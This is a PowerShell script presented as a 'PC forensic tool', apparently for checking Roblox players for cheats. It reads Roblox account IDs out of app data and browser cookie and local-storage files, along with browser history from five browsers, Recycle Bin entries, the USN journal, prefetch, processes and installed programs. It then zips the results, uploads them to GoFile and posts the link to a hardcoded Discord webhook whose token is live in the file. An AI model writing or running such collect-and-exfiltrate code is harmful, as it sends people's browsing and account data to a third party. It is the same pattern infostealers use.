# Enhanced PC Forensic Tool with Discord Webhook Integration
# Features: Brave/Mullvad browsers, deleted files, Roblox accounts, auto-upload to GoFile

param(
    [string]$WebhookURL = "https://discord.com/api/webhooks/1469718055591346380/u8BSIT-aDsZeuAue-sOa8Wla3wLj0hWY9bKZCbgSIP7SMCS24ao64q_PJPsVsYi599Ku"  # Discord webhook URL - set this or it will prompt
)

$ErrorActionPreference = "SilentlyContinue"

# Discord Webhook Configuration
if (-not $WebhookURL) {
    Write-Host "Enter Discord Webhook URL (or press Enter to skip): " -ForegroundColor Yellow -NoNewline
    $WebhookURL = Read-Host
}

# Create output directory with timestamp
$timestamp = Get-Date -Format "yyyy-MM-dd_HH-mm-ss"
$outputDir = "$env:USERPROFILE\Desktop\PCForensics_$timestamp"
New-Item -ItemType Directory -Path $outputDir -Force | Out-Null

$logFile = "$outputDir\FULL_LOG.txt"
$suspiciousItems = @()
$robloxAccounts = @()

function Write-Log {
    param($Message, $Color = "White")
    Write-Host $Message -ForegroundColor $Color
    Add-Content -Path $logFile -Value $Message
}

function Get-Separator {
    return "`n" + ("=" * 80) + "`n"
}

function Send-DiscordMessage {
    param($Content, $Embeds = @())
    
    if (-not $WebhookURL) { return }
    
    try {
        $payload = @{
            content = $Content
            embeds = $Embeds
        } | ConvertTo-Json -Depth 10
        
        Invoke-RestMethod -Uri $WebhookURL -Method Post -Body $payload -ContentType "application/json"
    } catch {
        Write-Log "Failed to send Discord message: $_" "Red"
    }
}

function Upload-ToGoFile {
    param($FilePath)
    
    try {
        Write-Log "`n[*] Uploading to GoFile: $FilePath" "Yellow"
        
        # Get GoFile server
        $serverResponse = Invoke-RestMethod -Uri "https://api.gofile.io/getServer" -Method Get
        if ($serverResponse.status -ne "ok") {
            Write-Log "Failed to get GoFile server" "Red"
            return $null
        }
        
        $server = $serverResponse.data.server
        
        # Upload file
        $uploadUrl = "https://$server.gofile.io/uploadFile"
        
        Add-Type -AssemblyName System.Net.Http
        $httpClient = New-Object System.Net.Http.HttpClient
        $form = New-Object System.Net.Http.MultipartFormDataContent
        
        $fileStream = [System.IO.File]::OpenRead($FilePath)
        $fileContent = New-Object System.Net.Http.StreamContent($fileStream)
        $form.Add($fileContent, "file", [System.IO.Path]::GetFileName($FilePath))
        
        $response = $httpClient.PostAsync($uploadUrl, $form).Result
        $responseContent = $response.Content.ReadAsStringAsync().Result
        
        $fileStream.Close()
        $httpClient.Dispose()
        
        $uploadResult = $responseContent | ConvertFrom-Json
        
        if ($uploadResult.status -eq "ok") {
            Write-Log "Upload successful: $($uploadResult.data.downloadPage)" "Green"
            return $uploadResult.data.downloadPage
        } else {
            Write-Log "Upload failed: $($uploadResult.status)" "Red"
            return $null
        }
    } catch {
        Write-Log "GoFile upload error: $_" "Red"
        return $null
    }
}

Write-Log "$(Get-Separator)" "Cyan"
Write-Log "ENHANCED PC FORENSIC & SYSTEM ANALYSIS TOOL" "Cyan"
Write-Log "Scan Started: $(Get-Date)" "Cyan"
Write-Log "$(Get-Separator)" "Cyan"

# Send initial Discord notification
Send-DiscordMessage -Content "🔍 **PC Forensic Scan Started**" -Embeds @(
    @{
        title = "Scan Information"
        description = "Starting comprehensive system analysis..."
        color = 3447003
        fields = @(
            @{ name = "Computer"; value = $env:COMPUTERNAME; inline = $true }
            @{ name = "User"; value = $env:USERNAME; inline = $true }
            @{ name = "Time"; value = (Get-Date -Format "yyyy-MM-dd HH:mm:ss"); inline = $false }
        )
    }
)

# ============================================================================
# SYSTEM INFORMATION
# ============================================================================
Write-Log "`n[*] Gathering System Information..." "Yellow"

$computerSystem = Get-CimInstance -ClassName Win32_ComputerSystem
$os = Get-CimInstance -ClassName Win32_OperatingSystem
$bios = Get-CimInstance -ClassName Win32_BIOS

Write-Log "`nComputer Name: $($computerSystem.Name)"
Write-Log "Username: $env:USERNAME"
Write-Log "Domain: $($computerSystem.Domain)"
Write-Log "OS: $($os.Caption) - Build $($os.BuildNumber)"
Write-Log "Install Date: $($os.InstallDate)"
Write-Log "Last Boot Time: $($os.LastBootUpTime)"
Write-Log "System Uptime: $((Get-Date) - $os.LastBootUpTime)"
Write-Log "BIOS Version: $($bios.SMBIOSBIOSVersion)"
Write-Log "Serial Number: $($bios.SerialNumber)"

# ============================================================================
# ROBLOX ACCOUNT DETECTION
# ============================================================================
Write-Log "`n[*] Searching for Roblox Accounts..." "Yellow"

$robloxFile = "$outputDir\ROBLOX_ACCOUNTS.txt"
"=== ROBLOX ACCOUNTS FOUND ===" | Out-File $robloxFile

# Check Roblox App LocalStorage
$robloxAppDataPaths = @(
    "$env:LOCALAPPDATA\Roblox\logs",
    "$env:LOCALAPPDATA\Roblox\LocalStorage",
    "$env:APPDATA\Roblox",
    "$env:LOCALAPPDATA\Packages\ROBLOXCORPORATION.ROBLOX_55nm5eh3cm0pr\LocalState",
    "$env:LOCALAPPDATA\Packages\ROBLOXCORPORATION.ROBLOX_55nm5eh3cm0pr\AC\INetCookies"
)

Write-Log "`nChecking Roblox Application Data..."
foreach ($path in $robloxAppDataPaths) {
    if (Test-Path $path) {
        Write-Log "Found Roblox data at: $path" "Green"
        Add-Content -Path $robloxFile -Value "`n=== $path ==="
        
        # Search for user IDs and usernames in files
        Get-ChildItem -Path $path -Recurse -File -ErrorAction SilentlyContinue | ForEach-Object {
            try {
                $content = Get-Content $_.FullName -Raw -ErrorAction SilentlyContinue
                
                # Extract User IDs (numeric, usually 8-10 digits)
                if ($content -match 'userId["\s:]+(\d{8,12})') {
                    $userId = $matches[1]
                    $accountInfo = "User ID: $userId (from $($_.Name))"
                    Add-Content -Path $robloxFile -Value $accountInfo
                    $robloxAccounts += $accountInfo
                    Write-Log "  Found User ID: $userId" "Green"
                }
                
                # Extract usernames
                if ($content -match 'username["\s:]+([a-zA-Z0-9_]{3,20})') {
                    $username = $matches[1]
                    $accountInfo = "Username: $username (from $($_.Name))"
                    Add-Content -Path $robloxFile -Value $accountInfo
                    $robloxAccounts += $accountInfo
                    Write-Log "  Found Username: $username" "Green"
                }
            } catch {}
        }
    }
}

# Check Browser Cookies and Local Storage for Roblox
$browserPaths = @{
    "Chrome" = @{
        "Cookies" = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies"
        "LocalStorage" = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Local Storage\leveldb"
    }
    "Edge" = @{
        "Cookies" = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Network\Cookies"
        "LocalStorage" = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Local Storage\leveldb"
    }
    "Brave" = @{
        "Cookies" = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Network\Cookies"
        "LocalStorage" = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Local Storage\leveldb"
    }
    "Mullvad" = @{
        "Cookies" = "$env:LOCALAPPDATA\Mullvad Browser\Profiles\*\cookies.sqlite"
        "LocalStorage" = "$env:LOCALAPPDATA\Mullvad Browser\Profiles\*\webappsstore.sqlite"
    }
    "Firefox" = @{
        "Cookies" = "$env:APPDATA\Mozilla\Firefox\Profiles\*\cookies.sqlite"
        "LocalStorage" = "$env:APPDATA\Mozilla\Firefox\Profiles\*\webappsstore.sqlite"
    }
}

Write-Log "`nChecking Browser Data for Roblox Accounts..."
foreach ($browser in $browserPaths.GetEnumerator()) {
    Write-Log "`nScanning $($browser.Key)..." "Yellow"
    
    foreach ($dataType in $browser.Value.GetEnumerator()) {
        $paths = Get-ChildItem -Path $dataType.Value -ErrorAction SilentlyContinue
        
        foreach ($path in $paths) {
            if (Test-Path $path) {
                Write-Log "  Found: $($dataType.Key) at $path" "Green"
                Add-Content -Path $robloxFile -Value "`n[$($browser.Key) - $($dataType.Key)] $path"
                
                try {
                    # For SQLite databases (Firefox, Mullvad)
                    if ($path -like "*.sqlite") {
                        # Try to read as text to find patterns
                        $content = Get-Content $path -Raw -Encoding Byte -ErrorAction SilentlyContinue
                        $textContent = [System.Text.Encoding]::ASCII.GetString($content)
                        
                        if ($textContent -match 'roblox') {
                            Add-Content -Path $robloxFile -Value "  Contains Roblox data"
                            
                            # Extract potential user IDs
                            $userIds = [regex]::Matches($textContent, '\d{8,12}') | Select-Object -ExpandProperty Value -Unique
                            foreach ($id in $userIds) {
                                if ($id -match '^\d{8,12}$') {
                                    $accountInfo = "Potential User ID: $id (from $($browser.Key) $($dataType.Key))"
                                    Add-Content -Path $robloxFile -Value "  $accountInfo"
                                    $robloxAccounts += $accountInfo
                                }
                            }
                        }
                    }
                    # For LevelDB (Chrome-based browsers)
                    elseif ($dataType.Key -eq "LocalStorage") {
                        Get-ChildItem -Path $path -Filter "*.log" -ErrorAction SilentlyContinue | ForEach-Object {
                            $content = Get-Content $_.FullName -Raw -ErrorAction SilentlyContinue
                            if ($content -match 'roblox') {
                                # Extract user IDs
                                if ($content -match 'userId["\s:]+(\d{8,12})') {
                                    $userId = $matches[1]
                                    $accountInfo = "User ID: $userId (from $($browser.Key) LocalStorage)"
                                    Add-Content -Path $robloxFile -Value "  $accountInfo"
                                    $robloxAccounts += $accountInfo
                                    Write-Log "    Found User ID: $userId" "Green"
                                }
                                
                                if ($content -match '"username":"([a-zA-Z0-9_]{3,20})"') {
                                    $username = $matches[1]
                                    $accountInfo = "Username: $username (from $($browser.Key) LocalStorage)"
                                    Add-Content -Path $robloxFile -Value "  $accountInfo"
                                    $robloxAccounts += $accountInfo
                                    Write-Log "    Found Username: $username" "Green"
                                }
                            }
                        }
                    }
                } catch {}
            }
        }
    }
}

Write-Log "`nTotal Roblox accounts/references found: $($robloxAccounts.Count)" "Cyan"
Write-Log "Roblox account data saved to: $robloxFile" "Green"

# ============================================================================
# BROWSER HISTORY - ENHANCED (Chrome, Edge, Brave, Mullvad, Firefox)
# ============================================================================
Write-Log "`n[*] Extracting Browser History..." "Yellow"

$browserHistoryFile = "$outputDir\BROWSER_HISTORY.txt"
"=== BROWSER HISTORY ===" | Out-File $browserHistoryFile

$historyPaths = @{
    "Chrome" = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History"
    "Edge" = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\History"
    "Brave" = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\History"
    "Mullvad" = "$env:LOCALAPPDATA\Mullvad Browser\Profiles\*\places.sqlite"
    "Firefox" = "$env:APPDATA\Mozilla\Firefox\Profiles\*\places.sqlite"
}

foreach ($browser in $historyPaths.GetEnumerator()) {
    Write-Log "`nExtracting $($browser.Key) history..." "Yellow"
    
    $paths = Get-ChildItem -Path $browser.Value -ErrorAction SilentlyContinue
    
    foreach ($historyPath in $paths) {
        if (Test-Path $historyPath) {
            Write-Log "  Found history database: $historyPath" "Green"
            Add-Content -Path $browserHistoryFile -Value "`n=== $($browser.Key) History ==="
            Add-Content -Path $browserHistoryFile -Value "Database: $historyPath"
            
            # Copy the database to temp location for reading
            $tempDb = "$env:TEMP\history_temp_$(Get-Random).db"
            Copy-Item $historyPath $tempDb -ErrorAction SilentlyContinue
            
            if (Test-Path $tempDb) {
                try {
                    # Try to extract URLs using text parsing
                    $content = Get-Content $tempDb -Raw -Encoding Byte -ErrorAction SilentlyContinue
                    $textContent = [System.Text.Encoding]::ASCII.GetString($content)
                    
                    # Extract URLs
                    $urls = [regex]::Matches($textContent, 'https?://[^\s\x00-\x1F"]+') | 
                            Select-Object -ExpandProperty Value -Unique | 
                            Where-Object { $_ -match '^https?://' } |
                            Select-Object -First 200
                    
                    Add-Content -Path $browserHistoryFile -Value "`nFound $($urls.Count) URLs (showing first 200):"
                    $urls | ForEach-Object { Add-Content -Path $browserHistoryFile -Value "  $_" }
                    
                } catch {
                    Add-Content -Path $browserHistoryFile -Value "Error reading database: $_"
                }
                
                Remove-Item $tempDb -Force -ErrorAction SilentlyContinue
            }
        } else {
            Add-Content -Path $browserHistoryFile -Value "`n$($browser.Key): Not found or not installed"
        }
    }
}

Write-Log "Browser history saved to: $browserHistoryFile" "Green"

# ============================================================================
# DELETED FILES RECOVERY
# ============================================================================
Write-Log "`n[*] Scanning for Recently Deleted Files..." "Yellow"

$deletedFile = "$outputDir\DELETED_FILES.txt"
"=== RECENTLY DELETED FILES ===" | Out-File $deletedFile

# Check Recycle Bin
Write-Log "`nChecking Recycle Bin..."
Add-Content -Path $deletedFile -Value "`n=== RECYCLE BIN ==="

$recycleBinPaths = @(
    "$env:SystemDrive\`$Recycle.Bin\$((Get-CimInstance Win32_UserAccount | Where-Object {$_.Name -eq $env:USERNAME}).SID)",
    "$env:USERPROFILE\`$Recycle.Bin"
)

foreach ($rbPath in $recycleBinPaths) {
    if (Test-Path $rbPath) {
        Write-Log "  Scanning: $rbPath" "Green"
        Get-ChildItem -Path $rbPath -Recurse -Force -ErrorAction SilentlyContinue | ForEach-Object {
            $deletedInfo = "$($_.LastWriteTime) - $($_.Name) - $($_.Length) bytes - $($_.FullName)"
            Add-Content -Path $deletedFile -Value $deletedInfo
            
            # Check for suspicious files
            $suspiciousKeywords = @("cheat", "hack", "inject", "bypass", "aimbot", "dll")
            foreach ($keyword in $suspiciousKeywords) {
                if ($_.Name -match $keyword) {
                    $suspiciousItems += "DELETED: $deletedInfo"
                }
            }
        }
    }
}

# Check for shadow copies / Volume Shadow Service
Write-Log "`nChecking Shadow Copies..."
Add-Content -Path $deletedFile -Value "`n=== SHADOW COPIES ==="

try {
    $shadowCopies = Get-CimInstance Win32_ShadowCopy
    if ($shadowCopies) {
        foreach ($shadow in $shadowCopies) {
            Add-Content -Path $deletedFile -Value "Shadow Copy ID: $($shadow.ID)"
            Add-Content -Path $deletedFile -Value "  Install Date: $($shadow.InstallDate)"
            Add-Content -Path $deletedFile -Value "  Device Object: $($shadow.DeviceObject)"
        }
    } else {
        Add-Content -Path $deletedFile -Value "No shadow copies found"
    }
} catch {
    Add-Content -Path $deletedFile -Value "Unable to query shadow copies: $_"
}

# Check USN Journal for deleted files (requires admin)
Write-Log "`nChecking USN Journal for file changes..."
Add-Content -Path $deletedFile -Value "`n=== USN JOURNAL (Recent File Operations) ==="

try {
    $fsutil = fsutil usn readjournal C: | Select-Object -First 500
    if ($fsutil) {
        Add-Content -Path $deletedFile -Value "Recent file system operations (500 entries):"
        $fsutil | Add-Content -Path $deletedFile
    }
} catch {
    Add-Content -Path $deletedFile -Value "Unable to read USN Journal (may require admin): $_"
}

Write-Log "Deleted files scan saved to: $deletedFile" "Green"

# ============================================================================
# CONTINUE WITH ORIGINAL FEATURES
# ============================================================================

# MUICache
Write-Log "`n[*] Analyzing MUICache..." "Yellow"
$muiCacheFile = "$outputDir\muicache_entries.txt"
$muiCachePaths = @(
    "HKCU:\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache",
    "HKLM:\SOFTWARE\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache"
)

foreach ($path in $muiCachePaths) {
    if (Test-Path $path) {
        $items = Get-ItemProperty -Path $path -ErrorAction SilentlyContinue
        if ($items) {
            $items.PSObject.Properties | ForEach-Object {
                if ($_.Name -notlike "PS*") {
                    $entry = "$($_.Name) = $($_.Value)"
                    Add-Content -Path $muiCacheFile -Value $entry
                    
                    $suspiciousKeywords = @("cheat", "hack", "inject", "bypass", "aimbot", "wallhack", "esp", "triggerbot", "macro", "exploit")
                    foreach ($keyword in $suspiciousKeywords) {
                        if ($_.Name -match $keyword -or $_.Value -match $keyword) {
                            $suspiciousItems += $entry
                        }
                    }
                }
            }
        }
    }
}
Write-Log "MUICache saved to: $muiCacheFile" "Green"

# Prefetch
Write-Log "`n[*] Analyzing Prefetch..." "Yellow"
$prefetchFile = "$outputDir\prefetch_files.txt"
$prefetchPath = "C:\Windows\Prefetch"

if (Test-Path $prefetchPath) {
    $prefetchFiles = Get-ChildItem -Path $prefetchPath -Filter "*.pf" -ErrorAction SilentlyContinue
    $prefetchFiles | Sort-Object LastWriteTime -Descending | ForEach-Object {
        $line = "$($_.LastWriteTime) - $($_.Name)"
        Add-Content -Path $prefetchFile -Value $line
        
        $suspiciousKeywords = @("CHEAT", "HACK", "INJECT", "BYPASS", "AIMBOT")
        foreach ($keyword in $suspiciousKeywords) {
            if ($_.Name -match $keyword) {
                $suspiciousItems += "PREFETCH: $($_.Name)"
            }
        }
    }
}
Write-Log "Prefetch saved to: $prefetchFile" "Green"

# Temp Files
Write-Log "`n[*] Scanning Temp folders..." "Yellow"
$tempFile = "$outputDir\temp_files.txt"
@($env:TEMP, "$env:LOCALAPPDATA\Temp", "C:\Windows\Temp") | ForEach-Object {
    if (Test-Path $_) {
        Get-ChildItem -Path $_ -Force -ErrorAction SilentlyContinue | 
        Sort-Object LastWriteTime -Descending | 
        Select-Object -First 100 | 
        ForEach-Object {
            Add-Content -Path $tempFile -Value "$($_.LastWriteTime) - $($_.Name) - $($_.Length) bytes"
        }
    }
}
Write-Log "Temp files saved to: $tempFile" "Green"

# Running Processes
Write-Log "`n[*] Analyzing processes..." "Yellow"
$processFile = "$outputDir\running_processes.txt"
Get-Process | ForEach-Object {
    $line = "$($_.ProcessName) - PID:$($_.Id) - $($_.Path)"
    Add-Content -Path $processFile -Value $line
    
    $suspiciousKeywords = @("cheat", "hack", "inject")
    foreach ($keyword in $suspiciousKeywords) {
        if ($_.ProcessName -match $keyword) {
            $suspiciousItems += "PROCESS: $($_.ProcessName)"
        }
    }
}
Write-Log "Processes saved to: $processFile" "Green"

# Installed Programs
Write-Log "`n[*] Gathering installed programs..." "Yellow"
$programsFile = "$outputDir\installed_programs.txt"
Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*,
                 HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* -ErrorAction SilentlyContinue |
Where-Object { $_.DisplayName } |
ForEach-Object {
    Add-Content -Path $programsFile -Value "$($_.DisplayName) - $($_.DisplayVersion) - $($_.Publisher)"
}
Write-Log "Programs saved to: $programsFile" "Green"

# ============================================================================
# CREATE SUMMARY REPORT
# ============================================================================
Write-Log "`n[*] Creating summary report..." "Yellow"

$summaryFile = "$outputDir\SUMMARY_REPORT.txt"
$isSuspicious = $suspiciousItems.Count -gt 0

$summary = @"
==============================================================================
                    PC FORENSIC ANALYSIS SUMMARY
==============================================================================

Scan Date: $(Get-Date -Format "yyyy-MM-dd HH:mm:ss")
Computer: $env:COMPUTERNAME
User: $env:USERNAME

==============================================================================
STATISTICS
==============================================================================

Roblox Accounts Found: $($robloxAccounts.Count)
Suspicious Items Found: $($suspiciousItems.Count)
Analysis Status: $(if ($isSuspicious) { "⚠️ SUSPICIOUS ACTIVITY DETECTED" } else { "✓ No obvious threats" })

==============================================================================
ROBLOX ACCOUNTS
==============================================================================

$($robloxAccounts | ForEach-Object { "- $_" } | Out-String)

==============================================================================
SUSPICIOUS FINDINGS
==============================================================================

$(if ($suspiciousItems.Count -gt 0) {
    $suspiciousItems | Sort-Object -Unique | ForEach-Object { "❌ $_" } | Out-String
} else {
    "✓ No suspicious items detected based on keyword analysis"
})

==============================================================================
FILES GENERATED
==============================================================================

- FULL_LOG.txt - Complete scan log
- SUMMARY_REPORT.txt - This summary
- ROBLOX_ACCOUNTS.txt - Roblox account information
- BROWSER_HISTORY.txt - Browser history from all browsers
- DELETED_FILES.txt - Recently deleted files
- muicache_entries.txt - Application execution history
- prefetch_files.txt - Prefetch analysis
- temp_files.txt - Temporary files
- running_processes.txt - Active processes
- installed_programs.txt - Installed software

==============================================================================
"@

$summary | Out-File $summaryFile
Write-Log "`nSummary report created: $summaryFile" "Green"

# ============================================================================
# UPLOAD TO GOFILE
# ============================================================================
Write-Log "`n$(Get-Separator)" "Cyan"
Write-Log "UPLOADING RESULTS TO GOFILE..." "Yellow"
Write-Log "$(Get-Separator)" "Cyan"

# Create a ZIP archive of all files
$zipFile = "$env:TEMP\PCForensics_$timestamp.zip"
Write-Log "`n[*] Creating ZIP archive..." "Yellow"

try {
    Compress-Archive -Path "$outputDir\*" -DestinationPath $zipFile -Force
    Write-Log "ZIP created: $zipFile" "Green"
    
    # Upload to GoFile
    $gofileUrl = Upload-ToGoFile -FilePath $zipFile
    
    if ($gofileUrl) {
        Write-Log "`n✓ GoFile Upload Successful!" "Green"
        Write-Log "Download URL: $gofileUrl" "Cyan"
        
        # Send to Discord
        if ($WebhookURL) {
            $embedColor = if ($isSuspicious) { 15158332 } else { 3066993 }  # Red if suspicious, green if clean
            
            $embed = @{
                title = if ($isSuspicious) { "⚠️ SUSPICIOUS ACTIVITY DETECTED" } else { "✓ Scan Complete - Clean" }
                description = "PC Forensic Analysis Results"
                color = $embedColor
                fields = @(
                    @{ name = "Computer"; value = $env:COMPUTERNAME; inline = $true }
                    @{ name = "User"; value = $env:USERNAME; inline = $true }
                    @{ name = "Scan Time"; value = (Get-Date -Format "yyyy-MM-dd HH:mm:ss"); inline = $false }
                    @{ name = "Roblox Accounts"; value = "$($robloxAccounts.Count) found"; inline = $true }
                    @{ name = "Suspicious Items"; value = "$($suspiciousItems.Count) detected"; inline = $true }
                    @{ name = "📦 Download Results"; value = "[$gofileUrl]($gofileUrl)"; inline = $false }
                )
                footer = @{
                    text = "PC Forensic Tool v2.0"
                }
                timestamp = (Get-Date).ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ss.fffZ")
            }
            
            # Add Roblox accounts to embed if found
            if ($robloxAccounts.Count -gt 0) {
                $robloxList = ($robloxAccounts | Select-Object -First 10 | ForEach-Object { "• $_" }) -join "`n"
                if ($robloxAccounts.Count -gt 10) {
                    $robloxList += "`n... and $($robloxAccounts.Count - 10) more"
                }
                $embed.fields += @{ name = "🎮 Roblox Accounts"; value = $robloxList; inline = $false }
            }
            
            # Add suspicious items to embed if found
            if ($suspiciousItems.Count -gt 0) {
                $suspList = ($suspiciousItems | Select-Object -First 5 | ForEach-Object { "• $_" }) -join "`n"
                if ($suspiciousItems.Count -gt 5) {
                    $suspList += "`n... and $($suspiciousItems.Count - 5) more (see full report)"
                }
                $embed.fields += @{ name = "⚠️ Suspicious Findings"; value = $suspList; inline = $false }
            }
            
            Send-DiscordMessage -Content "**Forensic Analysis Complete**" -Embeds @($embed)
            Write-Log "`n✓ Results sent to Discord webhook!" "Green"
        }
    } else {
        Write-Log "`n❌ GoFile upload failed" "Red"
    }
    
    # Clean up temp ZIP
    Remove-Item $zipFile -Force -ErrorAction SilentlyContinue
    
} catch {
    Write-Log "Error creating/uploading ZIP: $_" "Red"
}

# ============================================================================
# COMPLETION
# ============================================================================
Write-Log "`n$(Get-Separator)" "Cyan"
Write-Log "SCAN COMPLETE!" "Green"
Write-Log "Analysis Status: $(if ($isSuspicious) { '⚠️ SUSPICIOUS' } else { '✓ CLEAN' })" $(if ($isSuspicious) { "Red" } else { "Green" })
Write-Log "Results folder: $outputDir" "Cyan"
if ($gofileUrl) {
    Write-Log "GoFile Download: $gofileUrl" "Cyan"
}
Write-Log "$(Get-Separator)" "Cyan"

# Open results folder
Start-Process explorer.exe $outputDir

Write-Host "`nPress any key to exit..." -ForegroundColor Yellow
$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")